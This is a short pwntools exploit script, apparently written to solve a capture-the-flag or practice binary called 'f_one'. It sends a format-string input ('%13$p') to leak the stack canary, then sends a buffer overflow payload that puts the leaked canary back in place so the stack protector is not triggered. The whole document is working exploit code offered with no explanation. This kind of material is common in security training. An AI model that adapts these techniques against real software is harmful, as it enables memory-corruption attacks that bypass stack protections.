from pwn import *

exe = './f_one'
elf = context.binary = ELF(exe)
libc = elf.libc

context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
init-peda
continue
'''.format(**locals())

p = start()
p.sendlineafter('give me something:', '%13$p'.encode())
p.recvline()
canary = int(p.recvline().strip(), 16)
info('canary = {}'.format(canary))

p.clean()

payload = b'A'*56
payload += p64(canary)
payload += b'A'

p.sendline(payload)

print(p.recvall())
